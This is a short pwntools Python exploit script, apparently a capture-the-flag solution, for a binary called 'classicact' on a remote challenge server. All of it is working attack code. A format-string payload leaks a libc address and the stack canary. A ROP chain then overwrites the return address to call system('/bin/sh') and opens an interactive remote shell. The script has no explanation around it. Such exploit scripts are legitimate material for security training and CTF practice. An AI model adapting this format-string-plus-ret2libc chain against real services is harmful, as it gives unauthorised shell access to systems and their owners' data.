from pwn import *

def leak():
   p.sendline(b'%12$p.%19$p')
   p.recvuntil(b'Hello:')
   leaks=p.recv().strip(b'\nWhat would you like to do today?\n').split(b'.')
   libc.address=int(leaks[0],16)-libc.sym['_IO_2_1_stdout_'] 
   canary=int(leaks[1],16)
   return canary

def rop_system(canary):
   binsh=next(libc.search(b'/bin/sh\0'))
   system=libc.sym['system']
   ret = 0x40101a
   pop_rdi = 0x4013a3

   chain = cyclic(72)
   chain += p64(canary)
   chain += cyclic(8)
   chain += p64(ret)
   chain += p64(pop_rdi)
   chain += p64(binsh)
   chain += p64(system)
   p.sendline(chain)


e = context.binary = ELF('./classicact')
#libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc= ELF('./libc-20.04')
#p = process('./classicact',level="error")  
p = remote('0.cloud.chals.io',10058)

canary=leak()
rop_system(canary)
p.interactive()
